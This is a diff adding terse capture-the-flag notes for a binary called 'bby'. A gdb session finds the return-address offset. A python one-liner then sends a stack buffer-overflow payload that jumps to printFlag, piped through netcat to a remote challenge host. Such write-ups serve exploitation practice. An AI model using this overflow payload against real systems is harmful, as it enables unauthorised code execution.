@@ -1,0 +1,16 @@
+gdb bby
+	(gdb) info function
+	(gdb) disass printFlag
+		Dump of assembler code for function printFlag:
+		0x0804856d <+0>:	push	%esp
+		.
+		.
+	(gdb) b *0x080485f9
+	(gdb) r
+		AAAABBBBCCCCDDDDEEEEFFFFGGGG
+	(gdb) x/15x $esp
+	(gdb) c
+		Program received signal SIGSEGV, Segmentation fault.
+		0x47474747 in ?? ()
+
+(python -c "print 'A'*24 + '\x6d\x85\x04\x08'"; cat) | nc 146.148.95.248 2525
